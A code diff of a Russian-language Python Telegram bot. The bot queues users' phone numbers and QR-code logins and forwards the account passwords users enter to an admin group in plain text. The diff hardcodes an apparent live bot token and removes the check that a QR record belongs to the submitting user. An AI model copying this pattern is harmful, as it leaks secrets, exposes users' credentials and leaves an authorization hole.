@@ -19,8 +19,9 @@ from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
 
 # ==================== НАСТРОЙКИ ====================
 BOT_TOKEN = "8578138467:AAGbPz3xkMbyEtzUGnnPilrFXSRVnmgUEO4"
+BOT_USERNAME = "@Alishadjs_bot"
 ADMIN_IDS = [8632162183]
-GROUP_ID = -5276008102
+GROUP_ID = -1003980170491
 CHANNEL_ID = "-1003956938813"
 CHANNEL_URL = "https://t.me/jdkaksh"
 USD_RATE = 90
@@ -264,10 +265,7 @@ async def check_subscription(user_id: int) -> bool:
 
 async def is_vip(user_id: int) -> bool:
     async with aiosqlite.connect(DB_NAME) as db:
-        cur = await db.execute(
-            "SELECT is_vip, vip_until FROM users WHERE user_id = ?",
-            (user_id,)
-        )
+        cur = await db.execute("SELECT is_vip, vip_until FROM users WHERE user_id = ?", (user_id,))
         row = await cur.fetchone()
         if row and row[0] == 1 and row[1]:
             return datetime.strptime(row[1], "%Y-%m-%d %H:%M:%S") > datetime.now()
@@ -288,13 +286,6 @@ async def check_spam(user_id: int) -> bool:
             return (datetime.now() - last_time).total_seconds() < SPAM_LIMIT_SECONDS
         return False
 
-async def get_queue_position(user_id: int, queue_type: str) -> int:
-    queue = number_queue if queue_type == "number" else qr_queue
-    for i, item in enumerate(queue):
-        if item["user_id"] == user_id:
-            return i + 1
-    return -1
-
 async def add_to_queue(user_id: int, username: str, queue_type: str, number: str = None):
     queue = number_queue if queue_type == "number" else qr_queue
     is_user_vip = await is_vip(user_id)
@@ -312,7 +303,10 @@ async def add_to_queue(user_id: int, username: str, queue_type: str, number: str
     queue.clear()
     queue.extend(sorted_list)
     
-    return await get_queue_position(user_id, queue_type)
+    for i, item in enumerate(queue):
+        if item["user_id"] == user_id:
+            return i + 1
+    return -1
 
 async def process_next_in_queue(queue_type: str):
     queue = number_queue if queue_type == "number" else qr_queue
@@ -407,18 +401,9 @@ async def request_qr_from_queue(callback: CallbackQuery):
         await db.execute("UPDATE users SET qr_submitted = qr_submitted + 1 WHERE user_id = ?", (user_id,))
         await db.commit()
     
-    # Отправляем сообщение с ЯВНЫМ user_id и qr_id
-    msg = await bot.send_message(
-        GROUP_ID,
-        f"📱 *QR из очереди*\n"
-        f"{vip_status}👤 @{username}\n"
-        f"👤 ID пользователя: `{user_id}`\n"
-        f"🆔 QR ID: `{qr_id}`\n"
-        f"📊 В очереди: {len(qr_queue)} чел.\n\n"
-        f"*Ответьте на это сообщение фотографией QR-кода*",
-        parse_mode="Markdown"
-    )
+    msg_text = f"📱 *QR из очереди*\n{vip_status}👤 @{username}\nuserid:{user_id}\nqrid:{qr_id}\n📊 В очереди: {len(qr_queue)} чел.\n\n*Ответьте фото QR-кода*"
     
+    await bot.send_message(GROUP_ID, msg_text, parse_mode="Markdown")
     await bot.send_message(user_id, "📱 Твой запрос QR взят в обработку!\nОжидай фотографию QR-кода.")
     await callback.message.delete()
     await callback.answer()
@@ -511,41 +496,27 @@ async def start_qr(message: Message):
 # ==================== ОБРАБОТКА QR ФОТО ====================
 @router.message(F.photo, F.reply_to_message, F.chat.id == GROUP_ID)
 async def handle_qr_photo(message: Message):
-    replied_msg = message.reply_to_message
-    if not replied_msg or not replied_msg.text:
+    replied_text = message.reply_to_message.text or ""
+    
+    if "QR из очереди" not in replied_text:
         return
     
-    if "QR из очереди" not in replied_msg.text:
+    user_match = re.search(r'userid:(\d+)', replied_text)
+    qr_match = re.search(r'qrid:(\d+)', replied_text)
+    
+    if not user_match or not qr_match:
+        await message.reply("❌ Ошибка: не найдены ID в сообщении")
         return
-
-    # Ищем user_id
-    match_user = re.search(r'ID пользователя: `(\d+)`', replied_msg.text)
-    if not match_user:
-        # Попробуем старый формат
-        match_user = re.search(r'\(ID: `(\d+)`\)', replied_msg.text)
-        if not match_user:
-            await message.reply("❌ Не удалось найти пользователя в сообщении!")
-            return
     
-    user_id = int(match_user.group(1))
-    
-    # Ищем QR ID
-    match_qr = re.search(r'QR ID: `(\d+)`', replied_msg.text)
-    if not match_qr:
-        match_qr = re.search(r'ID: (\d+)', replied_msg.text)
-        if not match_qr:
-            await message.reply("❌ Не удалось найти QR ID!")
-            return
-    
-    qr_id = int(match_qr.group(1))
+    user_id = int(user_match.group(1))
+    qr_id = int(qr_match.group(1))
     photo_id = message.photo[-1].file_id
 
-    # Сохраняем фото
     async with aiosqlite.connect(DB_NAME) as db:
-        await db.execute("UPDATE numbers SET photo_id = ? WHERE id = ?", (photo_id, qr_id))
+        await db.execute("UPDATE numbers SET photo_id = ?, message_id = ? WHERE id = ?", 
+                        (photo_id, message.message_id, qr_id))
         await db.commit()
 
-    # Отправляем пользователю
     try:
         await bot.send_photo(
             user_id,
@@ -554,9 +525,8 @@ async def handle_qr_photo(message: Message):
             parse_mode="Markdown",
             reply_markup=qr_user_keyboard(qr_id)
         )
-        await message.reply("✅ QR отправлен пользователю!")
     except Exception as e:
-        await message.reply(f"❌ Ошибка отправки: {e}")
+        await message.reply(f"❌ Не удалось отправить QR пользователю: {e}")
 
 # ==================== ОБРАБОТКА НОМЕРОВ ====================
 @router.callback_query(F.data.startswith("code_sent_"))
@@ -673,7 +643,7 @@ async def qr_scanned(callback: CallbackQuery):
         row = await cur.fetchone()
         if row:
             await bot.send_message(GROUP_ID,
-                f"📱 *QR отсканирован*\n👤 ID: `{row[0]}`\n🆔 QR ID: {qr_id}\n\nПодтвердите результат:",
+                f"📱 *QR отсканирован*\n👤 userid:{row[0]}\nqrid:{qr_id}\n\nПодтвердите результат:",
                 parse_mode="Markdown", reply_markup=qr_result_keyboard(qr_id))
     
     await callback.message.edit_caption("✅ QR успешно отсканирован! Ожидайте подтверждения.", reply_markup=None)
@@ -754,17 +724,11 @@ async def qr_password_entered(message: Message, state: FSMContext):
     username = message.from_user.username or f"id{user_id}"
     
     async with aiosqlite.connect(DB_NAME) as db:
-        cur = await db.execute("SELECT number FROM numbers WHERE id = ? AND user_id = ?", (qr_id, user_id))
-        row = await cur.fetchone()
-        if not row:
-            await message.answer("❌ QR не найден!")
-            await state.clear()
-            return
         await db.execute("UPDATE numbers SET status = 'password_entered' WHERE id = ?", (qr_id,))
         await db.commit()
     
     await bot.send_message(GROUP_ID,
-        f"🔒 *Пароль от QR*\n👤 @{username} (ID: `{user_id}`)\n🔑 Пароль: `{password}`\n🆔 QR ID: {qr_id}",
+        f"🔒 *Пароль от QR*\n👤 @{username}\n🔑 Пароль: `{password}`\nqrid:{qr_id}",
         parse_mode="Markdown", reply_markup=qr_result_keyboard(qr_id))
     
     await message.answer("✅ Пароль отправлен!", reply_markup=main_menu())
